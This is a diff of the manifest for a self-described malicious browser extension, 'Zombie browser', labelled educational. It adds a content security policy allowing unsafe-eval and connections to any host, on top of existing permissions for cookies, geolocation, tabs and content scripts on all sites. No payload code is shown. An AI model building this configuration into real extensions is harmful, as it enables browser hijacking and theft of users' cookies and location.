@@ -1,11 +1,13 @@
 {
   "name": "Zombie browser",
-  "version": "1.0",
+  "version": "1.01",
   "description": "Malicious add-on. For educational and testing purposes only! Don't use it if you don't have permission to do that.",
   "background": {
     "page": "background.html"
   },
   "icons": {"128": "icon.png" },
+  "manifest_version": 2,
+  "content_security_policy" : "default-src 'self'; img-src 'self' http://localhost; script-src 'unsafe-eval';  object-src 'unsafe-eval'; connect-src * ;",
   "permissions": ["tabs","http://*/*","https://*/*","tts","geolocation","fileBrowserHandler","cookies"],
   "content_scripts": [{
       "matches": ["http://*/*","https://*/*"],
